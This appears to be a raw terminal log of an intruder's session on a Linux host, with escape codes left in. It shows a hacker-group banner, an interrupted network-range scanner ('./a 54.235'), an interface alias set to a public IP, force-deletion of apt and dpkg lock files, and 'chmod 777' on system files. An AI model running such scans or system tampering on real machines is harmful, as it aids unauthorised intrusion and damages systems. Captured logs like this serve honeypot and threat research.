+[4l[1;31m«[1;32m Created bY MaLa [1;31m»[0m
+INCERC SA DAU VIATZA CIBERNETICI
+# scanning: 54.235 (total: 0) (0.01% done)
+^C
+[4hsudo:~/gosh# screen
+bash: screen: command not found
+sudo:~/gosh# [Kscreen[6D[K./a 54.235[10D[K./a[3D[Kls[2D[Kifconfig eth1 54.235.161.133 up[31D[Kifconfig eth0:0 54.235.161.133 up[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1P[1D[1P
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hsudo:~/gosh# apt-get 
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hsudo:~/gosh# sudo apt-get -f install
+bash: sudo: command not found
+sudo:~/gosh# apt-get -f install screen
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hsudo:~/gosh# sudo mv /var/lib/apt/lists{,july12} 
+bash: sudo: command not found
+sudo:~/gosh# sudo rm /var/lib/apt/lists/lock
+bash: sudo: command not found
+sudo:~/gosh# [Ksudo rm /var/lib/apt/lists/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D-rf 
+bash: sudo: command not found
+sudo:~/gosh# [Ksudo rm -rf /var/lib/apt/lists/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1D[1P[1D[1P[1D[1P[1D[1P
+[4l[4hsudo:~/gosh# [K rm -rf /var/lib/apt/lists/lock[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P/var/cache/apt/archives/lock
+[4l[4hsudo:~/gosh# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hsudo:~/gosh# /var/lib/apt/lists/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1Dxhmod 777 
+bash: xhmod: command not found
+sudo:~/gosh# [Kxhmod 777 /var/lib/apt/lists/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1D[1Px
+bash: xhmod: command not found
+sudo:~/gosh# [Kxhmod 777 /var/lib/apt/lists/lock[33D[Kxhmod 777 /var/lib/apt/lists/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1D[1Pc
+[4l[4hsudo:~/gosh# [Kchmod 777 /var/lib/apt/lists/lock[33D[Kxhmod 777 /var/lib/apt/lists/lock[33D[Kxhmod 777 /var/lib/apt/lists/lock[33D[Kapt-get[7D[K rm -rf /var/cache/apt/archives/lock[36D[Kapt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hsudo:~/gosh#  sudo rm /var/lib/dpkg/lock
+bash: sudo: command not found
+sudo:~/gosh# sudo rm /var/cache/apt/archives/lock
+bash: sudo: command not found
+sudo:~/gosh# sudo rm /var/lib/apt/lists/lock
+bash: sudo: command not found
+sudo:~/gosh# rm /var/lib/dpkg/lock[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D -rf 
+[4l[4hsudo:~/gosh# [Krm -rf  /var/lib/dpkg/lock[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P/var/cache/apt/archives/lock
+[4l[4hsudo:~/gosh# [Krm -rf  /var/cache/apt/archives/lock[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P/var/lib/apt/lists/lock
+[4l[4hsudo:~/gosh# sudo apt-get install deborphan
+bash: sudo: command not found
+sudo:~/gosh# apt-get install deborphan
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  deborphan 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 570.2kB of archives.
+After this operation, 1254.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main deborphan 0.12-1 [570.2kB]
+Fetched 570.2kB in 1s (4493B/s)
+Reading package fields... Done
+^C
+[4hsudo:~/gosh# Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking deborphan (from .../archives/deborphan_0.12-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up deborphan (0.12-1) ...
+zzzzzz[6D[Kapt-get install deborphan[25D[Ksudo apt-get install deborphanZc
